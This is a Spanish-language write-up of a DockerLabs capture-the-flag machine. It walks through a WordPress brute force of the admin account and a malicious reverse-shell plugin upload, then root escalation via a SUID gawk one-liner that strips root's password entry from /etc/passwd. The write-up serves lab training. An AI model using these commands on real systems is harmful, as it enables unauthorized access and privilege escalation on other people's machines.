---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Medio
VectorInicial: WordPress brute force (admin:rockyou) + subida plugin malicioso
Privesc: SUID gawk → modificación /etc/passwd
Fecha: 2026-02-18
---
<img width="918" height="516" alt="Pasted image 20260217124550" src="https://github.com/user-attachments/assets/76afc7f1-689f-48fe-9a86-5249734c2675" />

Empezaremos con un reconocimiento de la superficie para que encontramos.

```bash
 gomap -s $TARGET
🎯 Scanning 192.168.1.100 (997 ports)

PORT    STATE  SERVICE         VERSION
80      open   http            Apache 2.4.58 (Ubuntu)

Host Exposure Summary
- 192.168.1.100 | open ports: 1 | critical: none | exposure: low

✓ Completed scan in 27ms | hosts: 1 | open ports: 1
```

Como solo tiene un puerto abierto nos dirigimos a la web para ver que encontramos.

Solo hay un botón con un error, pero esto es raro, así que procedemos a realizar una enumeración de directorios.

```bash
 gobuster dir -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wordpress            (Status: 301) [Size: 318] [--> http://192.168.1.100/wordpress/]
javascript           (Status: 301) [Size: 319] [--> http://192.168.1.100/javascript/]
phpmyadmin           (Status: 301) [Size: 319] [--> http://192.168.1.100/phpmyadmin/]
server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que tenemos un **Wordpress** y un **PhpMyAdmin**, así que empezaremos por navegar al *Wordpress*.

Pero nos redirige a un dominio así que lo indicaremos en */ect/hosts*.

```bash
 sudo nano /etc/hosts

127.0.0.1       localhost
127.0.1.1       jd-sec.intracof.local   jd-sec

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.1.100 escolares.dl
```

Encontramos la web de un guitarrista y procedemos a la enumeración visual de la web y posteriormente desde *wpscan*.

```bash
 wpscan --url http://escolares.dl/wordpress/ -e u,p
```

Visualmente no encontramos nada interesante, pero desde *wpscan encontramos*.

```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://escolares.dl/wordpress/ [192.168.1.100]
[+] Started: Tue Feb 17 15:52:54 2026

Interesting Finding(s):

<snip>

[i] Plugin(s) Identified:

[+] astra-sites
 | Location: http://escolares.dl/wordpress/wp-content/plugins/astra-sites/
 | Last Updated: 2026-02-17T05:27:00.000Z
 | [!] The version is out of date, the latest version is 4.4.50
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Starter Templates < 4.4.42 - Author+ Arbitrary File Upload via WXR Upload Bypass
 |     Fixed in: 4.4.42
 |     References:
 |      - https://wpscan.com/vulnerability/a6dcda12-a67f-4a81-9d30-0f2d886978fa
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13065
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/439e4c99-8f34-4e66-9d86-c0cbb8cf6da0
 |
 | Version: 4.4.10 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://escolares.dl/wordpress/wp-content/plugins/astra-sites/readme.txt

[+] elementor
 | Location: http://escolares.dl/wordpress/wp-content/plugins/elementor/
 | Last Updated: 2026-02-11T10:30:00.000Z
 | [!] The version is out of date, the latest version is 3.35.4
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 7 vulnerabilities identified:
 |
 | [!] Title: Elementor Website Builder < 3.27.5 - Contributor+ Stored XSS
 |     Fixed in: 3.27.5
 |     References:
 |      - https://wpscan.com/vulnerability/25374232-2f9c-453d-bc47-124f80e67a92
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-13445
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8a11e702-34d2-49ee-8762-cc3614a7950a
 |
 | [!] Title: Elementor Website Builder < 3.29.1 - Contributor+ Stored XSS
 |     Fixed in: 3.29.1
 |     References:
 |      - https://wpscan.com/vulnerability/fc8e4264-fa78-44d2-8b6d-6c4305cd2280
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50555
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/473bef81-b2c9-429c-aa23-c2dba0908cc3
 |
 | [!] Title: Elementor < 3.29.1 - Contributor+ Stored XSS
 |     Fixed in: 3.29.1
 |     References:
 |      - https://wpscan.com/vulnerability/34330a7b-d178-4998-9067-17ae2564cb9a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-3075
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/639693b6-369e-457e-a37e-30bdb8ea7275
 |
 | [!] Title: Elementor < 3.30.3 - Contributor+ Stored XSS via Text Path Widget
 |     Fixed in: 3.30.3
 |     References:
 |      - https://wpscan.com/vulnerability/785a15fe-18ef-4ae2-9143-c625a7a16063
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4566
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/af29ec92-5b07-4f57-a25f-19f3a894a193
 |
 | [!] Title: Elementor < 3.30.3 - Admin+ Arbitrary File Read via Image Import
 |     Fixed in: 3.30.3
 |     References:
 |      - https://wpscan.com/vulnerability/87fd0b78-c0e8-43a8-8b52-bd7a294a96e0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-8081
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/13929b51-b32e-401c-a642-49f7cd2d07bf
 |
 | [!] Title: Elementor Website Builder < 3.33.1 - Missing Authorization
 |     Fixed in: 3.33.1
 |     References:
 |      - https://wpscan.com/vulnerability/ebb1b7b0-cb97-4430-ac6a-e27fe8714b0e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-67588
 |      - https://vdp.patchstack.com/database/Wordpress/Plugin/elementor/vulnerability/wordpress-elementor-website-builder-plugin-3-33-0-broken-access-control-vulnerability
 |
 | [!] Title: Elementor < 3.33.4  - Contributor+ Stored DOM-Based XSS via Text Path
 |     Fixed in: 3.33.4
 |     References:
 |      - https://wpscan.com/vulnerability/bfe75150-4ae3-44c1-b886-4ff90ca9f0f4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11220
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1a73c078-ce66-4131-8bd7-6fd48fc9fa84
 |
 | Version: 3.26.3 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://escolares.dl/wordpress/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.26.3
 |  - http://escolares.dl/wordpress/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.26.3
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-content/plugins/elementor/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-content/plugins/elementor/readme.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://escolares.dl/wordpress/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-json/oembed/1.0/embed?url=http://escolares.dl/wordpress/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 
 <snip>
```

Tenemos un usuario como **admin** y 2 plugins vulnerables, *astra-sites* y *elementor*.

Lo interesante de estos plugins son las vulnerabilidades:
- astra-sites
	- Author+ Arbitrary File Upload via WXR Upload Bypass
- elementor
	- Admin+ Arbitrary File Read via Image Import

Buscamos información para ver cual de los 2 puede ser mas interesante.

Descubrimos que necesitamos al menos privilegios de autor o admin, así que vamos a probar a realizar un ataque de diccionario contra el usuario *admin* y encontrar su clave de acceso.

```bashh
 wpscan --url http://escolares.dl/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt

<skip>

[!] Valid Combinations Found:
 | Username: admin, Password: rockyou

<skip>
```

Ya con los credenciales iniciaremos sesión y nos dirigiremos a los plugins vulnerables.

Cabe recordar que no es necesario el uso de las vulnerabilidades puesto que tenemos la opción de usar el editor de themes para inyectar código y conseguir un revershell.

<img width="1903" height="847" alt="Pasted image 20260217170840" src="https://github.com/user-attachments/assets/68aa3290-e425-4185-8ee2-5ec05588114c" />

Pero como la finalidad de este laboratorio es la explotación de los plugin procederemos con los mismos.

Primero usaremos un método de subida de un plugin malicioso, así que crearemos un fichero **PHP** con un revershell de pentestmonkey y luego lo comprimiremos en formato *zip* para poder subirlo a la web.

No olvidar que al principio del fichero hay  que indicar unos datos para que reconozca que es un plugin.

```php
/*
Plugin Name: Revershell PentestMonkey
Description: Ejecución de conexión remota hacia atacante
Version: 1.0
Author: NexusFireMan
License: GPL2
*/
```

```bash
 nano shell.php

 7z a ./shell.zip ./shell.php
```

Ahora que tenemos el **zip** creado nos pondremos a la escucha con *penelope* para después subir el plugin y al activarlo conseguir un reversehell.

```bash
 penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.11.11 • 172.17.0.1 • 192.168.1.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

<img width="1503" height="719" alt="Pasted image 20260218091957" src="https://github.com/user-attachments/assets/e77c5e9c-4139-4134-a44c-04d2c5f29edd" />

Una vez activo el plugin obtendremos una revershell y estaremos dentro del servidor.

```bash
[+] Got reverse shell from 07ea20f65d0d~192.168.1.100-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/jduran/.penelope/sessions/07ea20f65d0d~192.168.1.100-Linux-x86_64/2026_02_18-09_40_47-986.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@07ea20f65d0d:/$ whoami
www-data
www-data@07ea20f65d0d:/$ ls
bin		  boot  etc   lib		 lib64  mnt  proc  run   sbin.usr-is-merged  sys  usr
bin.usr-is-merged  dev	home  lib.usr-is-merged  media  opt  root  sbin  srv		     tmp  var
www-data@07ea20f65d0d:/$ 
```

Ahora toca la escalada de privilegios, así que empezaremos a buscar vectores.

```bash
www-data@07ea20f65d0d:/$ sudo -l
[sudo] password for www-data:
```

Al intentar ver a que tenemos permiso nos encontramos con una barrera, pero vamos a ver si el usuario **admin** existe en el sistema por si reutilizara la misma contraseña que en la web.

```bash
www-data@07ea20f65d0d:/$ ls /home/
ubuntu
```

Vemos que este usuario no es el mismo y no nos sirve, intentemos buscar a ver si existe algún *SUID* y podemos aprovecharlo.

```bash
www-data@07ea20f65d0d:/$ find . -perm -4000 2>/dev/null 
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./usr/bin/newgrp
./usr/bin/chsh
./usr/bin/gpasswd
./usr/bin/passwd
./usr/bin/mount
./usr/bin/su
./usr/bin/umount
./usr/bin/chfn
./usr/bin/gawk
./usr/bin/sudo
```

Ahora solo nos queda buscar en *gtfobins* para realizar la escalada desde *gawk*.

```bash
gawk 'BEGIN {system("/bin/sh")}'
```

Pero esto solo abre una consola en modo *sh* de nuestro usuario así que indagamos mas y nos encontramos con una utilidad de este comando.

```bash
www-data@2a7ff2dd9abe:/$ /usr/bin/gawk -F 'x' '{print $1 $NF > "/etc/passwd"}' /etc/passwd
www-data@2a7ff2dd9abe:/$ su
root@2a7ff2dd9abe:/# whoami
root
root@2a7ff2dd9abe:/# cat /tmp/.secret.txt 
cHJlbWl1bXBhc3N3b3Jk
root@2a7ff2dd9abe:/# cat /tmp/.secret.txt | base64 -d
premiumpassword
root@2a7ff2dd9abe:/# 
```

Con este comando hemos podido quitar la **X** al usuario *root* y podemos hacer uso del comando *su* para escalar privilegios.

Ademas en la carpeta */tmp* nos encontramos un fichero curioso con una contraseña cifrada en *base64*.

Esta contraseña seguramente sea del usuario *ubuntu* o del *root* pero como ya tenemos la escalada lo dejaremos estar.
